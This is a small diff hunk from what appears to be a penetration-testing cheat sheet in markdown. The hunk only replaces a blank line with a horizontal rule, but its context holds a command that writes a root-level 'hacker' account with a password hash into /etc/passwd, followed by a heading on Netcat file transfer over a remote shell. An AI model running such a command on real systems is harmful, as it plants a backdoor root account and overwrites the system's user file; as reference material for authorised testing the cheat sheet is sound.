@@ -87,7 +87,7 @@ tree tmp
 ```
 echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
 ```
-
+---
 #### File Transfer on `Netcat`
 
 1. To download a file on the remote shell:
